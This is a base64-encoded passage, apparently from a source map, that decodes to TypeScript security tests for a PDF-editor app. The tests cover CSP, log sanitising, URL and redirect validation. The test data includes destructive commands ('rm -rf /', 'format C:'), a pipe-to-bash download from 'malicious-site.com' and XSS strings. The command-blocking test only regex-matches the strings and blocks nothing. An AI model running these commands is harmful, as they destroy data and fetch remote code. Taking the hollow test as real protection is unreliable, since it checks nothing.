O1xuXG4gICAgICBleHBlY3QodmFsaWRhdGVDU1Aoc2FmZUNzcCkpLnRvQmUodHJ1ZSk7XG4gICAgICBleHBlY3QodmFsaWRhdGVDU1AodW5zYWZlQ3NwKSkudG9CZShmYWxzZSk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdFcnJvciBIYW5kbGluZyBhbmQgTG9nZ2luZycsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHNhbml0aXplIGVycm9yIGxvZ3MnLCAoKSA9PiB7XG4gICAgICBjb25zdCBzYW5pdGl6ZUVycm9yID0gKGVycm9yOiBhbnkpID0+IHtcbiAgICAgICAgaWYgKCFlcnJvciB8fCB0eXBlb2YgZXJyb3IgIT09ICdvYmplY3QnKSB7XG4gICAgICAgICAgcmV0dXJuIHsgbWVzc2FnZTogJ1Vua25vd24gZXJyb3InLCB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKSB9O1xuICAgICAgICB9XG4gICAgICAgIFxuICAgICAgICByZXR1cm4ge1xuICAgICAgICAgIG1lc3NhZ2U6IHR5cGVvZiBlcnJvci5tZXNzYWdlID09PSAnc3RyaW5nJyA/IGVycm9yLm1lc3NhZ2Uuc3Vic3RyaW5nKDAsIDUwMCkgOiAnVW5rbm93biBlcnJvcicsXG4gICAgICAgICAgc3RhY2s6IHR5cGVvZiBlcnJvci5zdGFjayA9PT0gJ3N0cmluZycgPyBlcnJvci5zdGFjay5zdWJzdHJpbmcoMCwgMjAwMCkgOiB1bmRlZmluZWQsXG4gICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKClcbiAgICAgICAgfTtcbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IG1hbGljaW91c0Vycm9yID0ge1xuICAgICAgICBtZXNzYWdlOiAnQScucmVwZWF0KDEwMDApICsgJzxzY3JpcHQ+YWxlcnQoXCJ4c3NcIik8L3NjcmlwdD4nLFxuICAgICAgICBzdGFjazogJ0InLnJlcGVhdCg1MDAwKSxcbiAgICAgICAgbWFsaWNpb3VzUHJvcGVydHk6ICgpID0+IGNvbnNvbGUubG9nKCdoYWNrJylcbiAgICAgIH07XG5cbiAgICAgIGNvbnN0IHNhbml0aXplZCA9IHNhbml0aXplRXJyb3IobWFsaWNpb3VzRXJyb3IpO1xuICAgICAgZXhwZWN0KHNhbml0aXplZC5tZXNzYWdlLmxlbmd0aCkudG9CZUxlc3NUaGFuT3JFcXVhbCg1MDApO1xuICAgICAgZXhwZWN0KHNhbml0aXplZC5zdGFjaz8ubGVuZ3RoKS50b0JlTGVzc1RoYW5PckVxdWFsKDIwMDApO1xuICAgICAgZXhwZWN0KChzYW5pdGl6ZWQgYXMgYW55KS5tYWxpY2lvdXNQcm9wZXJ0eSkudG9CZVVuZGVmaW5lZCgpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCBpbXBsZW1lbnQgbG9nIHNpemUgbGltaXRzJywgKCkgPT4ge1xuICAgICAgY29uc3QgY2hlY2tMb2dTaXplID0gKGxvZ1NpemU6IG51bWJlciwgbWF4U2l6ZTogbnVtYmVyID0gMTAgKiAxMDI0ICogMTAyNCkgPT4ge1xuICAgICAgICByZXR1cm4gbG9nU2l6ZSA8PSBtYXhTaXplO1xuICAgICAgfTtcblxuICAgICAgZXhwZWN0KGNoZWNrTG9nU2l6ZSg1ICogMTAyNCAqIDEwMjQpKS50b0JlKHRydWUpOyAvLyA1TUIgLSBPS1xuICAgICAgZXhwZWN0KGNoZWNrTG9nU2l6ZSgxNSAqIDEwMjQgKiAxMDI0KSkudG9CZShmYWxzZSk7IC8vIDE1TUIgLSBUb28gbGFyZ2VcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0RlbmllZCBPcGVyYXRpb25zJywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgYmxvY2sgcmVidWlsZC1hcHAgaGFuZGxlciBjb21wbGV0ZWx5JywgKCkgPT4ge1xuICAgICAgLy8gVGhlIHJlYnVpbGQtYXBwIGhhbmRsZXIgc2hvdWxkIG5vdCBleGlzdCBhbnltb3JlXG4gICAgICBjb25zdCBoYW5kbGVycyA9IG5ldyBNYXAoKTtcbiAgICAgIFxuICAgICAgLy8gU2ltdWxhdGUgdGhlIG9sZCBkYW5nZXJvdXMgaGFuZGxlciBiZWluZyByZW1vdmVkXG4gICAgICBleHBlY3QoaGFuZGxlcnMuaGFzKCdyZWJ1aWxkLWFwcCcpKS50b0JlKGZhbHNlKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgcHJldmVudCBhcmJpdHJhcnkgY29tbWFuZCBleGVjdXRpb24nLCAoKSA9PiB7XG4gICAgICBjb25zdCBkYW5nZXJvdXNDb21tYW5kcyA9IFtcbiAgICAgICAgJ3JtIC1yZiAvJyxcbiAgICAgICAgJ2RlbCAvZiAvcyAvcSBDOlxcXFwqJyxcbiAgICAgICAgJ2Zvcm1hdCBDOicsXG4gICAgICAgICdzaHV0ZG93biAvcyAvdCAwJyxcbiAgICAgICAgJ2N1cmwgbWFsaWNpb3VzLXNpdGUuY29tIHwgYmFzaCdcbiAgICAgIF07XG5cbiAgICAgIC8vIFRoZXNlIHNob3VsZCBhbGwgYmUgYmxvY2tlZFxuICAgICAgZGFuZ2Vyb3VzQ29tbWFuZHMuZm9yRWFjaChjbWQgPT4ge1xuICAgICAgICBleHBlY3QoY21kKS50b01hdGNoKC9eKHJtfGRlbHxmb3JtYXR8c2h1dGRvd258Y3VybCkvKTtcbiAgICAgIH0pO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnTmV0d29yayBTZWN1cml0eScsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIGVuZm9yY2UgSFRUUFMgZm9yIGV4dGVybmFsIHJlcXVlc3RzJywgKCkgPT4ge1xuICAgICAgY29uc3QgdmFsaWRhdGVVUkwgPSAodXJsOiBzdHJpbmcpID0+IHtcbiAgICAgICAgdHJ5IHtcbiAgICAgICAgICBjb25zdCBwYXJzZWQgPSBuZXcgVVJMKHVybCk7XG4gICAgICAgICAgaWYgKHBhcnNlZC5ob3N0bmFtZSAhPT0gJ2xvY2FsaG9zdCcgJiYgcGFyc2VkLnByb3RvY29sICE9PSAnaHR0cHM6Jykge1xuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdIVFRQUyByZXF1aXJlZCBmb3IgZXh0ZXJuYWwgcmVxdWVzdHMnKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgcmV0dXJuIHRydWU7XG4gICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgICAgICAgcmV0dXJuIGZhbHNlO1xuICAgICAgICB9XG4gICAgICB9O1xuXG4gICAgICBleHBlY3QodmFsaWRhdGVVUkwoJ2h0dHBzOi8vYXBpLmV4YW1wbGUuY29tJykpLnRvQmUodHJ1ZSk7XG4gICAgICBleHBlY3QodmFsaWRhdGVVUkwoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMCcpKS50b0JlKHRydWUpO1xuICAgICAgZXhwZWN0KHZhbGlkYXRlVVJMKCdodHRwOi8vYXBpLmV4YW1wbGUuY29tJykpLnRvQmUoZmFsc2UpO1xuICAgICAgZXhwZWN0KHZhbGlkYXRlVVJMKCdmdHA6Ly9maWxlcy5leGFtcGxlLmNvbScpKS50b0JlKGZhbHNlKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgcHJldmVudCBvcGVuIHJlZGlyZWN0IHZ1bG5lcmFiaWxpdGllcycsICgpID0+IHtcbiAgICAgIGNvbnN0IHZhbGlkYXRlUmVkaXJlY3QgPSAodXJsOiBzdHJpbmcpID0+IHtcbiAgICAgICAgY29uc3QgYWxsb3dlZERvbWFpbnMgPSBbJ2xvY2FsaG9zdCcsICdkb2NzLnBkZmVkaXRvci5jb20nXTtcbiAgICAgICAgXG4gICAgICAgIHRyeSB7XG4gICAgICAgICAgY29uc3QgcGFyc2VkID0gbmV3IFVSTCh1cmwpO1xuICAgICAgICAgIHJldHVybiBhbGxvd2VkRG9tYWlucy5pbmNsdWRlcyhwYXJzZWQuaG9zdG5hbWUpO1xuICAgICAgICB9IGNhdGNoIHtcbiAgICAgICAgICByZXR1cm4gZmFsc2U7XG4gICAgICAgIH1cbiAgICAgIH07XG5cbiAgICAgIGV4cGVjdCh2YWxpZGF0ZVJlZGlyZWN0KCdodHRwczovL2RvY3MucGRmZWRpdG9yLmNvbScpKS50b0JlKHRydWUpO1xuICAgICAgZXhwZWN0KHZhbGlkYXRlUmVkaXJlY3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMCcpKS50b0JlKHRydWUpO1xuICAgICAgZXhwZWN0KHZhbGlkYXRlUmVkaXJlY3QoJ2h0dHBzOi8vbWFsaWNpb3VzLXNpdGUuY29tJykpLnRvQmUoZmFsc2UpO1xuICAgICAgZXhwZWN0KHZhbGlkYXRlUmVkaXJlY3QoJ2phdmFzY3JpcHQ6YWxlcnQoMSknKSkudG9CZShmYWxzZSk7XG4gICAgfSk7XG4gIH0pO1xufSk7Il0sInZlcnNpb24iOjN9